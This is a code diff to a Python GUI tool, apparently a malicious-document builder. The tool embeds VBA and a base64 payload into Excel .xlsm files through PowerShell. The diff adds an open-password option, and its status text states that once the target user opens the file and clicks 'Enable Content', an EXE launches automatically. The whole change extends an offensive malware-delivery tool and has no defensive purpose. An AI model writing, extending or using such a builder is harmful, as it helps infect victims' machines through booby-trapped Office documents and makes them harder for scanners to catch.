@@ -94,9 +94,11 @@ class K4LIApp:
         self.conv_preview_lbl = None
 
         # XLSM tab state
-        self.xlsx_hta_path = tk.StringVar(value="")
-        self.xlsx_out_var  = tk.StringVar(value="")
-        self.xlsx_running  = False
+        self.xlsx_hta_path  = tk.StringVar(value="")
+        self.xlsx_out_var   = tk.StringVar(value="")
+        self.xlsx_pw_var    = tk.StringVar(value="")
+        self.xlsx_pw_on     = tk.BooleanVar(value=False)
+        self.xlsx_running   = False
 
         self._prot_canvas    = None
         self._conv_canvas    = None
@@ -3094,6 +3096,38 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         ct_sb.pack(side="right", fill="y")
         self.xlsx_content_txt.pack(fill="both", expand=True)
 
+        # ── Password ──────────────────────────────────────────────────────
+        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(0, 14))
+        pw_row = tk.Frame(wrap, bg=BG_ROOT)
+        pw_row.pack(fill="x", pady=(0, 10))
+
+        def _toggle_pw():
+            if self.xlsx_pw_on.get():
+                pw_entry_frm.pack(fill="x", pady=(6, 0))
+            else:
+                pw_entry_frm.pack_forget()
+                self.xlsx_pw_var.set("")
+
+        pw_chk = tk.Checkbutton(
+            pw_row, text="SET  OPEN  PASSWORD  (Excel asks password on open)",
+            variable=self.xlsx_pw_on, command=_toggle_pw,
+            font=F_SM, fg=C_AMB, bg=BG_ROOT, selectcolor=BG_IN,
+            activebackground=BG_ROOT, activeforeground=C_AMB,
+            relief="flat", bd=0, cursor="hand2")
+        pw_chk.pack(side="left")
+
+        pw_entry_frm = tk.Frame(wrap, bg=BG_ROOT)
+        pw_brd = tk.Frame(pw_entry_frm, bg=BD_MID, padx=1, pady=1)
+        pw_brd.pack(fill="x")
+        pw_inn = tk.Frame(pw_brd, bg=BG_IN)
+        pw_inn.pack(fill="x")
+        tk.Label(pw_inn, text="Password:", font=F_SM, fg=C_G2,
+                 bg=BG_IN, padx=10).pack(side="left")
+        tk.Entry(pw_inn, textvariable=self.xlsx_pw_var,
+                 font=F_MONO, fg=C_AMB, bg=BG_IN, relief="flat",
+                 bd=0, insertbackground=C_AMB, show="*"
+                 ).pack(side="left", fill="x", expand=True, padx=(0, 10), pady=6)
+
         # ── Action button ─────────────────────────────────────────────────
         act = tk.Frame(wrap, bg=BG_ROOT)
         act.pack(fill="x", pady=(0, 14))
@@ -3265,6 +3299,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             b64_in     = str(b64_file)
             vba_in     = str(vba_file)
             cnt_in     = str(content_file)
+            open_pw    = self.xlsx_pw_var.get().strip() if self.xlsx_pw_on.get() else ""
 
             ps_script = (
                 '$ErrorActionPreference = "Stop"\n'
@@ -3288,7 +3323,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                 '  }\n'
                 f'  $vba = [System.IO.File]::ReadAllText("{vba_in}")\n'
                 '  $wb.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString($vba)\n'
-                f'  $wb.SaveAs("{tmp_out_ps}", 52)\n'
+                f'  $wb.SaveAs("{tmp_out_ps}", 52, "{open_pw}")\n'
                 '  $wb.Close($false)\n'
                 '  Write-Host "OK"\n'
                 '} finally {\n'
@@ -3323,10 +3358,17 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                 self._xlsx_ln("\n" + "─" * 60, "dm")
                 self._xlsx_ln("[OK]    XLSM created successfully.", "gn")
                 self._xlsx_ln(f"        File : {out_xlsm}", "g2")
+                if open_pw:
+                    self._xlsx_ln(f"        Pass : {open_pw}", "am")
                 self._xlsx_ln("─" * 60, "dm")
-                self._xlsx_ln(
-                    "\n[INFO]  User opens .xlsm → clicks 'Enable Content'\n"
-                    "        → EXE launches automatically  ✓", "cy")
+                if open_pw:
+                    self._xlsx_ln(
+                        "\n[INFO]  User opens .xlsm → enters password\n"
+                        "        → clicks 'Enable Content' → EXE launches  ✓", "cy")
+                else:
+                    self._xlsx_ln(
+                        "\n[INFO]  User opens .xlsm → clicks 'Enable Content'\n"
+                        "        → EXE launches automatically  ✓", "cy")
                 self._xlsx_ln(
                     "[NOTE]  Requires: Microsoft Excel on target machine.", "am")
             else:
